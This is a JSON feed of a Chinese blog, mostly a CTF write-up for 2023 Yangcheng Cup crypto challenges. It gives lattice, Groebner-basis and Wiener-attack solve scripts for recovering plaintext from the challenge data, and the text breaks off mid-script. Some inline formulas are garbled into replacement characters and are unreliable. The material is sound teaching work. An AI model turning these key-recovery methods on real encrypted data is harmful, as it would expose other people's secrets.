{
    "version": "https://jsonfeed.org/version/1",
    "title": "Walt's Blog",
    "description": "",
    "home_page_url": "http://waltcsz.github.io",
    "items": [
        {
            "id": "http://waltcsz.github.io/2023/12/",
            "url": "http://waltcsz.github.io/2023/12/",
            "title": "",
            "date_published": "2023-12-07T09:13:59.441Z",
            "content_html": "<h1 id=\"永远缅怀\"><a class=\"markdownIt-Anchor\" href=\"#永远缅怀\">#</a> 永远缅怀</h1>\n<p><img data-src=\"./1207/image-20231207171458831.png\" alt=\"image-20231207171458831\"></p>\n<h2 id=\"死于2023127\"><a class=\"markdownIt-Anchor\" href=\"#死于2023127\">#</a> 死于 2023/12/7</h2>\n<h2 id=\"因犯贱而亡\"><a class=\"markdownIt-Anchor\" href=\"#因犯贱而亡\">#</a> 因犯贱而亡</h2>\n",
            "tags": []
        },
        {
            "id": "http://waltcsz.github.io/2023/12/",
            "url": "http://waltcsz.github.io/2023/12/",
            "title": "",
            "date_published": "2023-12-05T15:34:15.316Z",
            "content_html": "<h1 id=\"羊城杯网络安全大赛初赛-2023\"><a class=\"markdownIt-Anchor\" href=\"#羊城杯网络安全大赛初赛-2023\">#</a> <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vWmltYUJsdWUvYXJ0aWNsZXMvMTc2NzQ5NTguaHRtbA==\"> 羊城杯网络安全大赛初赛 2023</span></h1>\n<h3 id=\"easy_3l\"><a class=\"markdownIt-Anchor\" href=\"#easy_3l\">#</a> Easy_3L</h3>\n<p>由于�3=�+��−�ℎ相对于�,�,ℎ等较小，而�也只有 512 比特，因此可以建立如下格：</p>\n<p>(lattice)[�02512�00ℎ10]</p>\n<p>系数为 (1,�,�)，短向量为 (�3,�,2512)</p>\n<p>这样可以把�3 求出来，联合 lcg 的其他输出求出模数，乘数和增量，最后恢复 seed 即 flag。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> gmpy2 <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>S1 <span class=\"token operator\">=</span> <span class=\"token number\">28572152986082018877402362001567466234043851789360735202177142484311397443337910028526704343260845684960897697228636991096551426116049875141</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>S2 <span class=\"token operator\">=</span> <span class=\"token number\">1267231041216362976881495706209012999926322160351147349200659893781191687605978675590209327810284956626443266982499935032073788984220619657447889609681888</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>S4 <span class=\"token operator\">=</span> <span class=\"token number\">9739918644806242673966205531575183334306589742344399829232076845951304871478438938119813187502023845332528267974698273405630514228632721928260463654612997</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>S5 <span class=\"token operator\">=</span> <span class=\"token number\">9755668823764800147393276745829186812540710004256163127825800861195296361046987938775181398489372822667854079119037446327498475937494635853074634666112736</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>p <span class=\"token operator\">=</span> <span class=\"token number\">25886434964719448194352673440525701654705794467884891063997131230558866479588298264578120588832128279435501897537203249743883076992668855905005985050222145380285378634993563571078034923112985724204131887907198503097115380966366598622251191576354831935118147880783949022370177789175320661630501595157946150891275992785113199863734714343650596491139321990230671901990010723398037081693145723605154355325074739107535905777351</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>h <span class=\"token operator\">=</span> <span class=\"token number\">2332673914418001018316159191702497430320194762477685969994411366563846498561222483921873160125818295447435796015251682805613716554577537183122368080760105458908517619529332931042168173262127728892648742025494771751133664547888267249802368767396121189473647263861691578834674578112521646941677994097088669110583465311980605508259404858000937372665500663077299603396786862387710064061811000146453852819607311367850587534711</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token number\">20329058681057003355767546524327270876901063126285410163862577312957425318547938475645814390088863577141554443432653658287774537679738768993301095388221262144278253212238975358868925761055407920504398004143126310247822585095611305912801250788531962681592054588938446210412897150782558115114462054815460318533279921722893020563472010279486838372516063331845966834180751724227249589463408168677246991839581459878242111459287</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>S3 <span class=\"token operator\">=</span> <span class=\"token number\">10700695166096094995375972320865971168959897437299342068124161538902514000691034236758289037664275323635047529647532200693311709347984126070052011571264606</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>t0 <span class=\"token operator\">=</span> S2 <span class=\"token operator\">-</span> S1</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>t1 <span class=\"token operator\">=</span> S3 <span class=\"token operator\">-</span> S2</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>t2 <span class=\"token operator\">=</span> S4 <span class=\"token operator\">-</span> S3</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>t3 <span class=\"token operator\">=</span> S5 <span class=\"token operator\">-</span> S4</pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>tmp1 <span class=\"token operator\">=</span> t2<span class=\"token operator\">*</span>t0 <span class=\"token operator\">-</span> t1<span class=\"token operator\">*</span>t1</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>tmp2 <span class=\"token operator\">=</span> t3<span class=\"token operator\">*</span>t1 <span class=\"token operator\">-</span> t2<span class=\"token operator\">*</span>t2</pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>n <span class=\"token operator\">=</span> gcd<span class=\"token punctuation\">(</span>tmp1<span class=\"token punctuation\">,</span>tmp2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">assert</span> isPrime<span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>a <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>S3 <span class=\"token operator\">-</span>S2<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> invert<span class=\"token punctuation\">(</span>S2<span class=\"token operator\">-</span>S1<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> n</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>b <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>S2 <span class=\"token operator\">-</span> a<span class=\"token operator\">*</span>S1<span class=\"token punctuation\">)</span><span class=\"token operator\">%</span>n</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>m <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>S1 <span class=\"token operator\">-</span> b<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> invert<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> n</pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"danger_rsa\"><a class=\"markdownIt-Anchor\" href=\"#danger_rsa\">#</a> Danger_RSA</h3>\n<p>根据 get_key 的 <code>s = getRandomRange(pow(2, a ** 2 - a + 4), pow(2, a ** 2 - a + 5))</code>  可知，s 和 t 的比特数应该是一致的，那么 s 和 t 都应该是 17 比特 (因为 e=st 是 34 比特)。稍微试一试可以发现就两种可能：�=5741⋅21 或�=5741⋅19。利用�2−�+5=17 可以解出 a 为 4。而 (��+�)(��+�)�取整就能得到�⋅�，那么设两个未知数，，�，�，联立起来用 gb 基就能出了。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># https://www.zhihu.com/people/ZM_________J/posts</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>N <span class=\"token operator\">=</span> <span class=\"token number\">20289788565671012003324307131062103060859990244423187333725116068731043744218295859587498278382150779775620675092152011336913225797849717782573829179765649320271927359983554162082141908877255319715400550981462988869084618816967398571437725114356308935833701495015311197958172878812521403732038749414005661189594761246154666465178024563227666440066723650451362032162000998737626370987794816660694178305939474922064726534186386488052827919792122844587807300048430756990391177266977583227470089929347969731703368720788359127837289988944365786283419724178187242169399457608505627145016468888402441344333481249304670223</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token number\">11079917583</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token number\">13354219204055754230025847310134936965811370208880054443449019813095522768684299807719787421318648141224402269593016895821181312342830493800652737679627324687428327297369122017160142465940412477792023917546122283870042482432790385644640286392037986185997262289003477817675380787176650410819568815448960281666117602590863047680652856789877783422272330706693947399620261349458556870056095723068536573904350085124198592111773470010262148170379730937529246069218004969402885134027857991552224816835834207152308645148250837667184968030600819179396545349582556181916861808402629154688779221034610013350165801919342549766</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>a <span class=\"token operator\">=</span> <span class=\"token number\">4</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>r <span class=\"token operator\">=</span> <span class=\"token number\">5741</span> <span class=\"token operator\">*</span> <span class=\"token number\">21</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>s <span class=\"token operator\">=</span> e<span class=\"token operator\">//</span>r</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>xy <span class=\"token operator\">=</span> floor<span class=\"token punctuation\">(</span>N<span class=\"token operator\">^</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token operator\">/</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>PR<span class=\"token punctuation\">.</span><span class=\"token operator\">&lt;</span>i<span class=\"token punctuation\">,</span> j<span class=\"token operator\">></span> <span class=\"token operator\">=</span> PolynomialRing<span class=\"token punctuation\">(</span>ZZ<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>f1 <span class=\"token operator\">=</span> i <span class=\"token operator\">*</span> j <span class=\"token operator\">-</span> xy<span class=\"token operator\">^</span>a</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>f2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">+</span> r<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>j <span class=\"token operator\">+</span> s<span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> N</pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>Ideal<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>f1<span class=\"token punctuation\">,</span> f2<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>groebner_basis<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>PR<span class=\"token punctuation\">.</span><span class=\"token operator\">&lt;</span>y<span class=\"token operator\">></span> <span class=\"token operator\">=</span> PolynomialRing<span class=\"token punctuation\">(</span>ZZ<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>f3 <span class=\"token operator\">=</span> <span class=\"token number\">120561</span><span class=\"token operator\">*</span>y<span class=\"token operator\">^</span><span class=\"token number\">2</span> <span class=\"token operator\">-</span> <span class=\"token number\">948332745914726488248328981194859346908046365000200456951397011146994307058832478357232073359436344663173247276027251189170318093864618179158166473762678075605794530450533379399031342448823677066080128206278927580027634528271117321568828703002589457393465199155431679915663793163542939559128871243591605854719744</span><span class=\"token operator\">*</span>y <span class=\"token operator\">+</span> <span class=\"token number\">1864692438550863016141513798266000457602215683433224185531339342064589113224894044383669854278154803113718866902994046297896336190499782613371882623108002469480950940164568578157835087851546395647804456836849393066035483723135754830910841251184687860129924668496392145025949962081507154567185557187395275125682979541696902825970897240275753338656369490224836320602268935569182448491632842336329824790467175952818105830205293157667738604308136292812715042893168532524955924995200131653889109432383462500230193043265225289229578761358749908792513075932245110484896336714915203401925339453476546946214380126883703133241088</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>f3<span class=\"token punctuation\">.</span>roots<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>后边解密参考 [*CTF 2021] Crypto - little case 的打法即可。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> itertools</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>N <span class=\"token operator\">=</span> <span class=\"token number\">20289788565671012003324307131062103060859990244423187333725116068731043744218295859587498278382150779775620675092152011336913225797849717782573829179765649320271927359983554162082141908877255319715400550981462988869084618816967398571437725114356308935833701495015311197958172878812521403732038749414005661189594761246154666465178024563227666440066723650451362032162000998737626370987794816660694178305939474922064726534186386488052827919792122844587807300048430756990391177266977583227470089929347969731703368720788359127837289988944365786283419724178187242169399457608505627145016468888402441344333481249304670223</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token number\">11079917583</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token number\">13354219204055754230025847310134936965811370208880054443449019813095522768684299807719787421318648141224402269593016895821181312342830493800652737679627324687428327297369122017160142465940412477792023917546122283870042482432790385644640286392037986185997262289003477817675380787176650410819568815448960281666117602590863047680652856789877783422272330706693947399620261349458556870056095723068536573904350085124198592111773470010262148170379730937529246069218004969402885134027857991552224816835834207152308645148250837667184968030600819179396545349582556181916861808402629154688779221034610013350165801919342549766</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>m <span class=\"token operator\">=</span> <span class=\"token number\">4</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>r <span class=\"token operator\">=</span> <span class=\"token number\">5741</span> <span class=\"token operator\">*</span> <span class=\"token number\">21</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>s <span class=\"token operator\">=</span> e<span class=\"token operator\">//</span>r</pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>bm <span class=\"token operator\">=</span> <span class=\"token number\">3891889986375336330559716098591764128742918441309724777337583126578227827768865619689858547513951476952436981068109005313431255086775128227872912287517417948310766208005723508039484956447166240210962374423348694952997002274647622939970550008327647559433222317977926773242269276334110863262269534189811046416</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>q <span class=\"token operator\">=</span> bm <span class=\"token operator\">+</span> s</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>p <span class=\"token operator\">=</span> N <span class=\"token operator\">//</span> q</pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">assert</span> p<span class=\"token operator\">*</span>q <span class=\"token operator\">==</span> N</pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">get_oneroot</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        Zp <span class=\"token operator\">=</span> Zmod<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        g <span class=\"token operator\">=</span> Zp<span class=\"token punctuation\">.</span>random_element<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        g <span class=\"token operator\">=</span> g<span class=\"token operator\">^</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> e<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token keyword\">for</span> mult <span class=\"token keyword\">in</span> divisors<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>mult <span class=\"token operator\">!=</span> e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>                g2 <span class=\"token operator\">=</span> g<span class=\"token operator\">^</span>mult</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>g2 <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>                    <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>            <span class=\"token keyword\">return</span> g</pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">decrypt</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    w <span class=\"token operator\">=</span> gcd<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span> p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    e1<span class=\"token punctuation\">,</span> p1 <span class=\"token operator\">=</span> e <span class=\"token operator\">//</span> w<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> w</pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    d <span class=\"token operator\">=</span> inverse_mod<span class=\"token punctuation\">(</span>e1<span class=\"token punctuation\">,</span> p1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    c1 <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    g<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b <span class=\"token operator\">=</span> xgcd<span class=\"token punctuation\">(</span>p1<span class=\"token punctuation\">,</span> w<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    g <span class=\"token operator\">=</span> get_oneroot<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> w<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    m <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c1<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token punctuation\">[</span>ZZ<span class=\"token punctuation\">(</span>m <span class=\"token operator\">*</span> g<span class=\"token operator\">^</span>i<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>w<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>mp_list <span class=\"token operator\">=</span> decrypt<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Find root p OK'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>mq_list <span class=\"token operator\">=</span> decrypt<span class=\"token punctuation\">(</span>q<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Find root q OK'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre><span class=\"token keyword\">for</span> mp<span class=\"token punctuation\">,</span> mq <span class=\"token keyword\">in</span> itertools<span class=\"token punctuation\">.</span>product<span class=\"token punctuation\">(</span>mp_list<span class=\"token punctuation\">,</span> mq_list<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    m <span class=\"token operator\">=</span> crt<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>mp<span class=\"token punctuation\">,</span> mq<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span>p<span class=\"token punctuation\">,</span> q<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    msg <span class=\"token operator\">=</span> long_to_bytes<span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token string\">b'DAS'</span> <span class=\"token keyword\">in</span> msg<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>        <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>        </pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'done'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"esyrsa\"><a class=\"markdownIt-Anchor\" href=\"#esyrsa\">#</a> esyRSA</h3>\n<p>这么抽象的题我第一次见，不知道是不是故意的，出题人把 n 复制了两遍连在一起。发现这一点就很简单了，n 和 d 大小接近，维纳分解 n 即可。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">possible</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span>alist<span class=\"token punctuation\">,</span>N<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> alist<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">if</span> x<span class=\"token operator\">==</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>            <span class=\"token keyword\">continue</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        phi <span class=\"token operator\">=</span> floor<span class=\"token punctuation\">(</span>e<span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token operator\">/</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>N<span class=\"token operator\">-</span>phi<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">%</span><span class=\"token number\">2</span><span class=\"token operator\">==</span><span class=\"token number\">0</span> <span class=\"token keyword\">and</span> sqrt<span class=\"token punctuation\">(</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>N<span class=\"token operator\">-</span>phi<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">//</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span>N<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>is_integer<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>                <span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span>q<span class=\"token punctuation\">)</span><span class=\"token operator\">=</span>var<span class=\"token punctuation\">(</span><span class=\"token string\">'p,q'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>                x<span class=\"token operator\">=</span>solve<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">==</span>phi<span class=\"token punctuation\">,</span> p<span class=\"token operator\">*</span>q<span class=\"token operator\">==</span>N<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">,</span>q<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>                <span class=\"token keyword\">return</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">'=='</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            <span class=\"token keyword\">continue</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">wiener_attack</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span>N<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    c<span class=\"token operator\">=</span>continued_fraction<span class=\"token punctuation\">(</span>e<span class=\"token operator\">/</span>N<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    alist<span class=\"token operator\">=</span>c<span class=\"token punctuation\">.</span>convergents<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">return</span> possible<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span>alist<span class=\"token punctuation\">,</span>N<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>n <span class=\"token operator\">=</span> <span class=\"token 